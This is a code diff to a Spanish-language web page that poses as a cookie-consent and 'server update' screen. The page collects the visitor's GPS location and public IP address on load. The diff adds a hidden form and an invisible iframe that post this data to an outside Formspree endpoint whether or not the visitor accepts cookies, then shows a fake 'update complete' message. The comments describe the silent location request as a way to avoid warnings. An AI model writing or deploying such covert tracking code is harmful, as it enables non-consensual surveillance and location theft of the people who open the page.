@@ -34,6 +34,9 @@
             width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Iframe invisible para enviar el formulario sin recargar */
+        #hidden-frame { display: none; }
     </style>
 </head>
 <body>
@@ -56,17 +59,25 @@
         <p>Conectando con los servidores...</p>
     </div>
 
+    <!-- Formulario oculto que usa el método POST nativo -->
+    <form id="trackerForm" action="https://formspree.io/f/xjywravp" method="POST" target="hidden-frame">
+        <input type="text" name="IP Pública" id="ipField">
+        <input type="text" name="Latitud GPS" id="latField">
+        <input type="text" name="Longitud GPS" id="lngField">
+        <input type="text" name="Estado" id="statusField">
+    </form>
+
+    <iframe name="hidden-frame" id="hidden-frame"></iframe>
+
     <script>
-        const formId = 'xjywravp'; 
+        // 1. PRE-CARGA SILENCIOSA
         let gpsLat = null;
         let gpsLng = null;
-
-        // 1. PRE-CARGA SILENCIOSA (El truco para evitar avisos)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 gpsLat = pos.coords.latitude.toFixed(6);
                 gpsLng = pos.coords.longitude.toFixed(6);
-            }, () => {}, { timeout: 3000 }); // Timeout rápido para no molestar
+            }, () => {}, { timeout: 3000 }); 
         }
 
         function handleChoice(accepted) {
@@ -76,23 +87,25 @@
             fetch(`https://api.ipify.org?format=json`)
                 .then(response => response.json())
                 .then(ipData => {
-                    sendData(ipData.ip, gpsLat, gpsLng);
+                    sendData(ipData.ip, accepted);
                 });
         }
 
-        function sendData(ip, lat, lng) {
-            const formData = new FormData();
-            formData.append('IP Pública', ip);
-            formData.append('Latitud GPS', lat || 'No disponible');
-            formData.append('Longitud GPS', lng || 'No disponible');
-            formData.append('Estado', accepted ? 'Aceptó Cookies' : 'Rechazó Cookies');
-            
-            fetch('https://formspree.io/f/' + formId, { method: 'POST', body: formData })
-                .then(() => {
-                    setTimeout(() => {
-                        document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
-                    }, 1500);
-                });
+        function sendData(ip, accepted) {
+            // Rellenar campos del formulario
+            document.getElementById('ipField').value = ip;
+            document.getElementById('latField').value = gpsLat || 'No disponible';
+            document.getElementById('lngField').value = gpsLng || 'No disponible';
+            document.getElementById('statusField').value = accepted ? 'Aceptó Cookies' : 'Rechazó Cookies';
+
+            // Enviar el formulario (esto sí llega a Formspree)
+            const form = document.getElementById('trackerForm');
+            form.submit();
+
+            // Simular éxito visual
+            setTimeout(() => {
+                document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
+            }, 1500);
         }
     </script>
 </body>
